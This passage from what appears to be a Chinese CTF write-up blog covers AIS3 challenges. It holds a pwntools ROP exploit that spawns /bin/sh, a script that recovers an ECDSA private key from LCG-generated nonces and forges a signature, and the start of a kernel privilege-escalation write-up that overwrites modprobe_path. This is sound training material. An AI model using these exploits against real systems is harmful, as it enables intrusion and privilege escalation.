class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = remote(<span class="hljs-string">&quot;chals1.ais3.org&quot;</span>, <span class="hljs-number">50961</span>)<br><span class="hljs-comment">#r = process(&quot;./chal&quot;)</span><br><br>puts = <span class="hljs-number">0x4010a0</span><br>read = <span class="hljs-number">0x4010c0</span><br><br>read_got = <span class="hljs-number">0x404010</span><br>fwrite_got = <span class="hljs-number">0x404030</span><br>puts_plt = <span class="hljs-number">0x0000000000401030</span><br>puts_got = <span class="hljs-number">0x404000</span><br>kill_curious = <span class="hljs-number">0x0000000000401207</span><br><br>competetion = <span class="hljs-number">0x404080</span><br><br><span class="hljs-comment"># competetion</span><br>pop_rdi = <span class="hljs-number">0x4011fe</span><br>pop_rsi = <span class="hljs-number">0x401200</span><br>pop_rdx = <span class="hljs-number">0x401202</span><br><br>rop2_adr = <span class="hljs-number">0x404100</span><br>rop = p64(pop_rdi) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(rop2_adr) + p64(pop_rdx) + p64(<span class="hljs-number">0x100</span>) + p64(read) + p64(pop_rsi) + p64(read_got) + p64(pop_rdx) + p64(<span class="hljs-number">0x1</span>) + p64(read) + p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x3b</span>)<br>rop = rop[:-<span class="hljs-number">1</span>]<br>rop2 = p64(read) + p64(pop_rdi) + p64(<span class="hljs-number">0x4041f0</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(read)<br>r.sendafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, rop)<br><br><span class="hljs-comment"># rank</span><br>r.sendlineafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;-17&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, p64(kill_curious)*<span class="hljs-number">2</span>)<br><br>r.recvlines(<span class="hljs-number">6</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>): r.sendlineafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;aaa&quot;</span>)<br>r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>): r.sendlineafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;aaa&quot;</span>)<br><br><span class="hljs-comment"># exploit</span><br>r.sendafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, (p64(competetion - <span class="hljs-number">0x8</span>)+p64(<span class="hljs-number">0x4012d3</span>))[:<span class="hljs-number">15</span>])<br><br>rop2 = rop2 + <span class="hljs-string">b&quot;\x00&quot;</span>*(<span class="hljs-number">0xf0</span>-<span class="hljs-built_in">len</span>(rop2)) + <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>r.sendline(rop2)<br>raw_input()<br>r.sendline(<span class="hljs-string">b&quot;_&quot;</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><blockquote><p><code>AIS3&#123;Curious_1$_v3rY_S@d_7h4T_y0U_w4n7_T0_k1lI_h!m_TT&#125;</code></p></blockquote><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>我把靈魂賤賣給了AI</p><h2 id="SlowECDSA"><a href="#SlowECDSA" class="headerlink" title="SlowECDSA"></a>SlowECDSA</h2><p><img src="https://hackmd.io/_uploads/SJimd0Vzle.png" alt="image"></p><p>這裡用ECDSA簽名，但<code>k</code>是用LCG產生的<br>$k_{i+1} &#x3D; (a \cdot k_i + c) \pmod{m}$<br>$m$ 是橢圓曲線的階<code>order</code>，$a$ 和 $c$ 是LCG的已知常數</p><ul><li>$a &#x3D; 1103515245$</li><li>$c &#x3D; 12345$</li><li><code>m = order = sk.curve.generator.order()</code>(對於 NIST192p 曲線，<code>order = 6277101735386680763835789423207666416083908700390324961279</code>)</li></ul><p>獲取兩個由LCG連續產生的nonce $k_1$ 跟 $k_2$ 所對應的簽名，我們可建立一個關於私鑰 $d$ ，就可以建立一個關於私鑰 $d$ (<code>sk.privkey.secret_multiplier</code>) 的方程並解出它</p><p>ECDSA簽名 $(r, s)$ 的公式為：<br>$s &#x3D; k^{-1} (h + r \cdot d) \pmod{order}$<br>$h$ 是訊息的雜湊值，這裡可以改寫成<br>$k &#x3D; s^{-1} (h + r \cdot d) \pmod{order}$</p><ol><li><p>呼叫兩次<code>get_example</code>，就可以獲取同個訊息<code>example_msg</code>的兩個簽名 $(r_1, s_1)$ 跟 $(r_2, s_2)$ 。這兩個簽名分別使用了由LCG產生的連續nonce $k_1$ 跟 $k_2$，滿足 $k_2 &#x3D; (a \cdot k_1 + c) \pmod{order}$</p></li><li><p>計算訊息的sha1並取模<code>order</code> $h_{ex} &#x3D; \text{int.from_bytes(hashlib.sha1(b”example_msg”).digest(), ‘big’) % order}$ </p></li><li><p>恢復私鑰 $d$</p><ol><li>$k_1 \equiv s_1^{-1} (h_{ex} + r_1 \cdot d) \pmod{order}$</li><li>$k_2 \equiv s_2^{-1} (h_{ex} + r_2 \cdot d) \pmod{order}$</li><li>$k_2 \equiv (a \cdot k_1 + c) \pmod{order}$</li></ol><p> 把 (1) 跟 (2) 帶入 (3):<br> $s_2^{-1} (h_{ex} + r_2 \cdot d) \equiv a \cdot [s_1^{-1} (h_{ex} + r_1 \cdot d)] + c \pmod{order}$</p><p> 這個方程式是關於 $d$ 的線性方程式，整理之後：<br> $d (s_2^{-1} r_2 - a s_1^{-1} r_1) \equiv h_{ex} (a s_1^{-1} - s_2^{-1}) + c \pmod{order}$</p><p> 私鑰 $d$ 可計算如下<br> $\text{term_d_coeff} &#x3D; (s_2^{-1} r_2 - a s_1^{-1} r_1) \pmod{order}</p></li></ol><p>\text{term_const} &#x3D; (h_{ex} (a s_1^{-1} - s_2^{-1}) + c) \pmod{order}<br>d &#x3D; (\text{term_const} \cdot \text{pow}(\text{term_d_coeff}, -1, \text{order})) \pmod{order}$</p><pre><code class="hljs">(注意：$s_1^&#123;-1&#125;$ 和 $s_2^&#123;-1&#125;$ 分別是 $s_1$ 和 $s_2$ 在模 ``order`` 下的模反元素)</code></pre><ol start="4"><li><p>為訊息<code>give_me_flag</code>偽造簽名<br>計算<code>give_me_flag</code>的sha1<br>$h_{flag} &#x3D; \text{int.from_bytes(hashlib.sha1(b”give_me_flag”).digest(), ‘big’) % order}$</p><p>選擇一個隨機的 nonce $k_{forge}$ (一個介於 1 和 order-1 之間的隨機數)</p><p>計算橢圓曲線點 $R_{forge} &#x3D; k_{forge} \cdot G$，其中 $G$ 是 NIST192p 曲線的生成點</p><p>$r_{forge} &#x3D; R_{forge}.x() \pmod{order}$<br>(如果 $r_{forge} &#x3D;&#x3D; 0$ ，則重新選擇 $k_{forge}$ 並重試)</p><p>$s_{forge} &#x3D; (\text{pow}(k_{forge}, -1, \text{order}) \cdot (h_{flag} + r_{forge} \cdot d)) \pmod{order}$<br>(如果 $s_{forge} &#x3D;&#x3D; 0$，則重新選擇 $k_{forge}$ 並重試)</p></li></ol><!--我是AI爛仔AI思路:![image](https://hackmd.io/_uploads/rknYuCEzxe.png)![image](https://hackmd.io/_uploads/HkOs_RVzle.png)![image](https://hackmd.io/_uploads/HyEh_0VMeg.png)![image](https://hackmd.io/_uploads/rJ1aOA4zxe.png)AI腳本 + pwntools自動化:--><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> ecdsa <span class="hljs-keyword">import</span> NIST192p <span class="hljs-comment"># NIST192p is an alias for SECP192r1</span><br><span class="hljs-keyword">from</span> ecdsa.util <span class="hljs-keyword">import</span> number_to_string, string_to_number<br><span class="hljs-keyword">import</span> os <span class="hljs-comment"># For os.urandom</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = remote(<span class="hljs-string">&#x27;chals1.ais3.org&#x27;</span>, <span class="hljs-number">19000</span>)<br><br><span class="hljs-comment"># 橢圓曲線和 LCG 參數 (來自原始挑戰腳本)</span><br>curve = NIST192p<br>order = curve.order  <span class="hljs-comment"># 橢圓曲線的階，也是 LCG 的模 m</span><br>G = curve.generator  <span class="hljs-comment"># 橢圓曲線的生成點</span><br><br>a_lcg = <span class="hljs-number">1103515245</span>  <span class="hljs-comment"># LCG 參數 a</span><br>c_lcg = <span class="hljs-number">12345</span>     <span class="hljs-comment"># LCG 參數 c</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_private_key</span>(<span class="hljs-params">r1_hex, s1_hex, r2_hex, s2_hex</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    根據兩組連續簽名 (r1, s1) 和 (r2, s2) 來計算私鑰 d。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 將十六進制輸入轉換為整數</span><br>    r1 = <span class="hljs-built_in">int</span>(r1_hex, <span class="hljs-number">16</span>)<br>    s1 = <span class="hljs-built_in">int</span>(s1_hex, <span class="hljs-number">16</span>)<br>    r2 = <span class="hljs-built_in">int</span>(r2_hex, <span class="hljs-number">16</span>)<br>    s2 = <span class="hljs-built_in">int</span>(s2_hex, <span class="hljs-number">16</span>)<br><br>    example_msg_bytes = <span class="hljs-string">b&quot;example_msg&quot;</span><br>    h_ex = <span class="hljs-built_in">int</span>.from_bytes(hashlib.sha1(example_msg_bytes).digest(), <span class="hljs-string">&#x27;big&#x27;</span>) % order<br><br>    <span class="hljs-comment"># 計算模反元素</span><br>    inv_s1 = <span class="hljs-built_in">pow</span>(s1, -<span class="hljs-number">1</span>, order)<br>    inv_s2 = <span class="hljs-built_in">pow</span>(s2, -<span class="hljs-number">1</span>, order)<br><br>    <span class="hljs-comment"># 從以下方程解出 d:</span><br>    <span class="hljs-comment"># d * (inv_s2 * r2 - a_lcg * inv_s1 * r1) = h_ex * (a_lcg * inv_s1 - inv_s2) + c_lcg (mod order)</span><br>    <br>    term_d_coeff = (inv_s2 * r2 - a_lcg * inv_s1 * r1) % order<br>    term_const = (h_ex * (a_lcg * inv_s1 - inv_s2) + c_lcg) % order<br>    <br>    <span class="hljs-keyword">if</span> term_d_coeff == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Coefficient of d is zero, cannot compute modular inverse. Attack may fail with these signatures.&quot;</span>)<br><br>    private_key_d = (term_const * <span class="hljs-built_in">pow</span>(term_d_coeff, -<span class="hljs-number">1</span>, order)) % order<br>    <span class="hljs-keyword">return</span> private_key_d<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">forge_signature</span>(<span class="hljs-params">private_key_d, message_bytes</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    使用已知的私鑰 d 為給定訊息偽造 ECDSA 簽名。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    h_msg = <span class="hljs-built_in">int</span>.from_bytes(hashlib.sha1(message_bytes).digest(), <span class="hljs-string">&#x27;big&#x27;</span>) % order<br><br>    k_forge = <span class="hljs-number">0</span><br>    r_forge = <span class="hljs-number">0</span><br>    s_forge = <span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># 不斷嘗試直到找到有效的 k, r, s (r 和 s 均不為 0)</span><br>    <span class="hljs-keyword">while</span> r_forge == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> s_forge == <span class="hljs-number">0</span>:<br>        <span class="hljs-comment"># 為 NIST192p 產生一個 192 位元的 k</span><br>        <span class="hljs-comment"># os.urandom(24) 提供 24 字節 = 192 位元</span><br>        k_forge_candidate = <span class="hljs-built_in">int</span>.from_bytes(os.urandom(<span class="hljs-number">24</span>), <span class="hljs-string">&#x27;big&#x27;</span>) % order<br>        <span class="hljs-keyword">if</span> k_forge_candidate == <span class="hljs-number">0</span>: <span class="hljs-comment"># 確保 k 不為 0</span><br>            <span class="hljs-keyword">continue</span><br>        k_forge = k_forge_candidate<br>        <br>        R_forge_point = k_forge * G<br>        r_forge = R_forge_point.x() % order<br>        <span class="hljs-keyword">if</span> r_forge == <span class="hljs-number">0</span>: <span class="hljs-comment"># ECDSA 要求 r 不為 0</span><br>            <span class="hljs-keyword">continue</span><br><br>        inv_k_forge = <span class="hljs-built_in">pow</span>(k_forge, -<span class="hljs-number">1</span>, order)<br>        s_forge = (inv_k_forge * (h_msg + r_forge * private_key_d)) % order<br>        <span class="hljs-comment"># ECDSA 要求 s 不為 0</span><br>    <br>    <span class="hljs-keyword">return</span> h_msg, k_forge, r_forge, s_forge<br><br><span class="hljs-comment"># 主腳本執行部分</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ECDSA LCG Nonce 攻擊腳本&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">40</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;使用曲線: <span class="hljs-subst">&#123;curve.name&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;曲線階 (LCG 的模 m): <span class="hljs-subst">&#123;order&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;LCG a: <span class="hljs-subst">&#123;a_lcg&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;LCG c: <span class="hljs-subst">&#123;c_lcg&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">40</span>)<br><br>    <span class="hljs-comment"># 使用者需要從伺服器的 &quot;get_example&quot; 選項提供這些值</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;請提供從 &#x27;get_example&#x27; 獲取的兩組連續簽名：&quot;</span>)<br>    <br>    r.recvlines(<span class="hljs-number">2</span>)<br>    r.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;get_example&quot;</span>)<br>    r.recvline()<br>    r1_hex_input = r.recvline().decode().replace(<span class="hljs-string">&quot;r: &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).strip() <span class="hljs-comment">#input(&quot;輸入 r1 (來自第一次 get_example, 十六進制): &quot;).strip()</span><br>    s1_hex_input = r.recvline().decode().replace(<span class="hljs-string">&quot;s: &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).strip() <span class="hljs-comment">#input(&quot;輸入 s1 (來自第一次 get_example, 十六進制): &quot;).strip()</span><br>    r.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;get_example&quot;</span>)<br>    r.recvline()<br>    r2_hex_input = r.recvline().decode().replace(<span class="hljs-string">&quot;r: &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).strip() <span class="hljs-comment">#input(&quot;輸入 r2 (來自第二次 get_example, 十六進制): &quot;).strip()</span><br>    s2_hex_input = r.recvline().decode().replace(<span class="hljs-string">&quot;s: &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).strip() <span class="hljs-comment">#input(&quot;輸入 s2 (來自第二次 get_example, 十六進制): &quot;).strip()</span><br><br>    <span class="hljs-keyword">try</span>:<br>        recovered_d = calculate_private_key(r1_hex_input, s1_hex_input, r2_hex_input, s2_hex_input)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n--- 私鑰恢復結果 ---&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;恢復出的私鑰 d (十進制): <span class="hljs-subst">&#123;recovered_d&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;恢復出的私鑰 d (十六進制): <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(recovered_d)&#125;</span>&quot;</span>)<br><br>        target_message_bytes = <span class="hljs-string">b&quot;give_me_flag&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n--- 為訊息 &#x27;<span class="hljs-subst">&#123;target_message_bytes.decode()&#125;</span>&#x27; 偽造簽名 ---&quot;</span>)<br>        <br>        h_flag, k_chosen_for_forge, r_flag_forged, s_flag_forged = forge_signature(recovered_d, target_message_bytes)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;要簽名的訊息: \&quot;<span class="hljs-subst">&#123;target_message_bytes.decode()&#125;</span>\&quot;&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;訊息雜湊值 h_flag (十六進制): <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(h_flag)&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;本次簽名選擇的 k_forge (十六進制): <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(k_chosen_for_forge)&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;偽造的 r_flag (十六進制): <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(r_flag_forged)&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;偽造的 s_flag (十六進制): <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(s_flag_forged)&#125;</span>&quot;</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n--- 如何使用這些值 ---&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1. 連接到挑戰伺服器。&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2. 選擇 &#x27;verify&#x27; 選項。&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;3. 輸入訊息 (Enter message): <span class="hljs-subst">&#123;target_message_bytes.decode()&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;4. 輸入 r (Enter r (hex)): <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(r_flag_forged)&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;5. 輸入 s (Enter s (hex)): <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(s_flag_forged)&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;如果私鑰和計算都正確，您應該能成功獲取 FLAG。&quot;</span>)<br>        <br>        r.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;verify&quot;</span>)<br>        r.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;give_me_flag&quot;</span>)<br>        r.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-built_in">hex</span>(r_flag_forged).encode())<br>        r.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-built_in">hex</span>(s_flag_forged).encode())<br>    <br>        r.interactive()<br><br>    <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n錯誤: 輸入無效。請確保十六進制值正確。 (<span class="hljs-subst">&#123;e&#125;</span>)&quot;</span>)<br>        r.close()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n發生錯誤: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;這可能是因為 (inv_s2 * r2 - a_lcg * inv_s1 * r1) % order 等於 0，導致其模反元素不存在。&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;或者，您輸入的簽名值不正確。&quot;</span>)<br>        r.close()<br></code></pre></td></tr></table></figure><p>Gemini Pro是MVP!!</p><blockquote><p><code>AIS3&#123;Aff1n3_nounc3s_c@N_bE_broke_ezily...&#125;</code></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>writeups</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>學了Linux Kernel Pwn之後我終於可以解開AIS3 Pre-exam 2024 : EBH了好耶好耶</title>
    <link href="/2025/05/07/AIS3-Pre-exam-2024-EBH-writeups/"/>
    <url>/2025/05/07/AIS3-Pre-exam-2024-EBH-writeups/</url>
    
    <content type="html"><![CDATA[<h1 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h1><p><a href="https://github.com/Curious-Lucifer/My_CTF_Challenges/tree/master/AIS3_Pre-Exam_2024/Pwn-EBH">https://github.com/Curious-Lucifer/My_CTF_Challenges/tree/master/AIS3_Pre-Exam_2024/Pwn-EBH</a></p><p>Flag在<code>/flag</code>，只有root可以讀取到</p><p>本題沒有開啟kaslr(內核的東西位址都固定)<br>本題有開啟smep跟smap，內核態不可訪問&#x2F;執行用戶空間的數據</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>/usr/bin/qemu-system-x86_64 \<br>    -kernel ./bzImage \<br>    -initrd ./initramfs.cpio \<br>    -cpu kvm64,+smep,+smap \<br>    -nographic \<br>    -append <span class="hljs-string">&quot;console=ttyS0 nokaslr oops=panic panic=1&quot;</span> \<br>    -no-reboot<br></code></pre></td></tr></table></figure><h1 id="Unintended-Solution"><a href="#Unintended-Solution" class="headerlink" title="Unintended Solution"></a>Unintended Solution</h1><p>最終目標是修改<code>modprobe_path</code>，執行自己的腳本去改<code>/flag</code>的權限，這樣就可以拿到flag了</p><p>用<code>write_to_address()</code>可以達到這個目的，但是<code>modprobe_path</code>的位址是<code>0xffffffff82444620</code>，顯然無法通過<code>data.target &lt; (void *)0xffffffff00000001</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">write_to_address</span><span class="hljs-params">(WriteToAddrData *ptr)</span><br><br>&#123;<br>  <span class="hljs-type">long</span> lVar1;<br>  WriteToAddrData data;<br>  <br>  lVar1 = _copy_from_user(&amp;data,ptr,<span class="hljs-number">0x18</span>);<br>  <span class="hljs-keyword">if</span> (((lVar1 == <span class="hljs-number">0</span>) &amp;&amp; (data.target &lt; (<span class="hljs-type">void</span> *)<span class="hljs-number">0xffffffff00000001</span>)) &amp;&amp; (data.size &lt; <span class="hljs-number">0x61</span>)) &#123;<br>    lVar1 = _copy_from_user(data.target,data.src);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    lVar1 = <span class="hljs-number">-0xe</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> lVar1;<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>peek_physical()</code>，給定物理記憶體位址<code>data.phyaddr</code>，function會使用<code>ioremap_nocache()</code>將那個位址的物理記憶體映射到虛擬記憶體上，到function結束也不會拿掉這個映射，所以後面我們可以利用這個新映射出來的虛擬記憶體位址。<br>經過測試，給<code>modprobe_path</code>的物理記憶體位址，每次都會映射到虛擬記憶體位址<code>0xffffc90000045620</code>，也可以通過上面<code>write_to_address()</code>的檢查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">peek_physical</span><span class="hljs-params">(PeekPhysicalData *ptr)</span><br><br>&#123;<br>  <span class="hljs-type">long</span> lVar1;<br>  PeekPhysicalData data;<br>  <br>  lVar1 = _copy_from_user(&amp;data,ptr,<span class="hljs-number">0x18</span>);<br>  <span class="hljs-keyword">if</span> ((lVar1 == <span class="hljs-number">0</span>) &amp;&amp; (lVar1 = ioremap_nocache(data.phyaddr,data.peeksize), lVar1 != <span class="hljs-number">0</span>)) &#123;<br>    lVar1 = _copy_to_user(data.peekdata,lVar1,data.peeksize);<br>    <span class="hljs-keyword">return</span> lVar1;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">-0xe</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>獲取<code>modprobe_path</code>物理記憶體位址，可以透過<code>get_physical()</code>，給一個虛擬記憶體位址，就會回傳映射到這個位址上的物理記憶體的位址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 